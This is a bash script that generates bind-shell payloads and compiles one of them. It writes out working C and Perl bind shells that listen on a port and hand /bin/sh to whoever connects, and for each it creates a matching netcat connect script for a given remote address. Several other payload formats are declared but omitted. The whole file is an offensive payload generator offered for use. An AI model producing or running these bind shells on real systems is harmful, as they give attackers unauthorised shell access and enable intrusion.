#!/usr/bin/env bash
set -euo pipefail

if [ $# -ne 3 ]; then
    echo "Usage: $0 <REMOTE_ADDR> <PORT_START> <OUTPUT_DIR>"
    exit 1
fi

REMOTE="$1"
PORT="$2"
OUTDIR="$3"

linux_formats=(c perl python netcat bash php_exec php_fsock ruby nodejs java)
windows_formats=(c perl python netcat bash php asp powershell)

declare -A EXT_LINUX=(
    [c]=c [perl]=pl [python]=py [netcat]=sh [bash]=sh
    [php_exec]=php [php_fsock]=php [ruby]=rb [nodejs]=js [java]=java
)
declare -A EXT_WINDOWS=(
    [c]=c [perl]=pl [python]=py [netcat]=bat [bash]=bat
    [php]=php [asp]=asp [powershell]=ps1
)

mkdir -p "$OUTDIR/linux" "$OUTDIR/windows"

make_listener() {
    local p="$1"; local path="$2"
    echo "#!/usr/bin/env bash" > "$path"
    echo "nc -vvvv "$REMOTE" $p" >> "$path"
    chmod +x "$path"
}

# Linux bind shells
for fmt in "${linux_formats[@]}"; do
    p="$PORT"; ext="${EXT_LINUX[$fmt]}"
    out="$OUTDIR/linux/bind_${fmt}.${ext}"
    case "$fmt" in
        c)
            cat > "${out}.c" <<EOF
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
int main(){
    int sock,conn; struct sockaddr_in addr;
    sock=socket(AF_INET,SOCK_STREAM,0);
    addr.sin_family=AF_INET; addr.sin_addr.s_addr=INADDR_ANY; addr.sin_port=htons(${PORT});
    bind(sock,(struct sockaddr*)&addr,sizeof(addr));
    listen(sock,1);
    conn=accept(sock,NULL,NULL);
    dup2(conn,0);dup2(conn,1);dup2(conn,2);
    execl("/bin/sh","sh",NULL);
    return 0;
}
EOF
            gcc -static -O2 -s -o "$OUTDIR/linux/bind_c.bin" "${out}.c"
            ;;
        perl)
            cat > "$out" <<EOF
#!/usr/bin/perl
use IO::Socket::INET;
my \$sock = IO::Socket::INET->new(Listen=>1,LocalPort=>$PORT,Reuse=>1) or die\$!;
while(my \$cli=\$sock->accept()){
    open(STDIN,"<&",\$cli);open(STDOUT,">&",\$cli);open(STDERR,">&",\$cli);
    exec("/bin/sh -i");
}
EOF
            chmod +x "$out"
            ;;
        # Additional formats omitted for brevity
    esac
    make_listener "$p" "$out.listener.sh"
    PORT=$((PORT+1))
done

echo "✅ Génération complète des bind shells dans '$OUTDIR/'"
